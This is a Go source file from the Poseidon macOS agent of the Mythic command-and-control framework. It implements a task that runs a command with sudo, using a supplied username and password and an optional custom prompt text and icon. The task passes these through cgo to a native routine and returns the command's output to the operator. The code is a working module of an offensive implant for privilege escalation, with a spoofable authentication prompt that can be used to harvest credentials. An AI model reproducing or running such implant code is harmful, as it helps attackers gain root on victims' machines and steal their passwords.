//go:build darwin

package sudo

/*
#cgo LDFLAGS: -framework Security -framework Foundation
#cgo CFLAGS: -x objective-c
#include "sudo_darwin.h"
*/
import "C"
import (
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"io"
	"os"
	"unsafe"
)

func sudoWithPromptOption(task structs.Task, args Arguments) {
	msg := task.NewResponse()

	cUsername := C.CString(args.Username)
	defer C.free(unsafe.Pointer(cUsername))
	cPassword := C.CString(args.Password)
	defer C.free(unsafe.Pointer(cPassword))
	cPromptText := C.CString(args.PromptText)
	defer C.free(unsafe.Pointer(cPromptText))
	cPromptIconPath := C.CString(args.PromptIconPath)
	defer C.free(unsafe.Pointer(cPromptIconPath))
	cCommand := C.CString(args.Command)
	defer C.free(unsafe.Pointer(cCommand))
	cFD := C.int(0)
	contents := C.sudo_poseidon(cUsername, cPassword, cPromptText, cPromptIconPath, cCommand, &cFD)
	fd := int(cFD)
	if fd > 0 {
		newFD := os.NewFile(uintptr(cFD), "pipe")
		if newFD == nil {
			msg.SetError("Failed to get file descriptor for output of command")
			task.Job.SendResponses <- msg
			return
		}
		defer newFD.Close()
		data := make([]byte, 1024)
		n, err := newFD.Read(data)
		if err != nil && n == 0 {
			if err == io.EOF {
				msg.Completed = true
				msg.Status = "completed"
				task.Job.SendResponses <- msg
				return
			}
			msg.SetError(err.Error())
			task.Job.SendResponses <- msg
			return
		}
		msg.UserOutput = string(data[0:n])
		msg.Completed = true
		task.Job.SendResponses <- msg
	} else {
		msg.SetError(C.GoString(contents))
		task.Job.SendResponses <- msg
		return
	}

}
